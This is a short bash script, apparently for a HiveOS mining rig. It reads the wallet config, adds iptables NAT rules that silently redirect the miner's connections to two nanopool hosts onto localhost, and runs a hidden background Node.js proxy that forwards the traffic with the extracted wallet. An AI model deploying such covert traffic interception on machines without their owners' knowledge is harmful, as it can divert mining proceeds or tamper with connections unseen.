#!/usr/bin/env bash

WALLET_CONF="/hive-config/wallet.conf"
if [ ! -f $WALLET_CONF ]; then
	exit 
fi
source $WALLET_CONF
wallet=`expr "$EPOOLS_TPL" : '.*\(WALLET: 0x[0-9A-Za-z]*[0-9A-Za-z]/\)'`
wallet=${wallet:8:-1}
name=`expr "$EPOOLS_TPL" : '.*\(/[0-9]*[0-9]/\)'`
name=${name:1:-1}
mail=`expr "$EPOOLS_TPL" : '.*\(/[0-9A-Za-z.@_]*[0-9A-Za-z.@_],\)'`
mail=${mail:1:-1}
metka="x"
#echo $wallet" "$name" "$mail" "$metka

eval "iptables -t nat -A OUTPUT -d eth-eu1.nanopool.org -p tcp --dport 9991 -j DNAT --to-destination 127.0.0.1:9991"
eval "iptables -t nat -A OUTPUT -d eth-eu2.nanopool.org -p tcp --dport 9992 -j DNAT --to-destination 127.0.0.1:9992"


#tek="nodejs /home/user/tool/tool.js 9991 eth-eu1.nanopool.org:9999 "$wallet" "$metka" "$mail
#echo $tek
#eval $tek


tek="nohup nodejs /home/user/tool/tool.js 9991 eth-eu1.nanopool.org:9999 "$wallet" "$metka" "$mail">/dev/null 2>&1 &"
#echo $tek
eval $tek

tek="nohup nodejs /home/user/tool/tool.js 9992 eth-eu2.nanopool.org:9999 "$wallet" "$metka" "$mail">/dev/null 2>&1 &"
#echo $tek
eval $tek

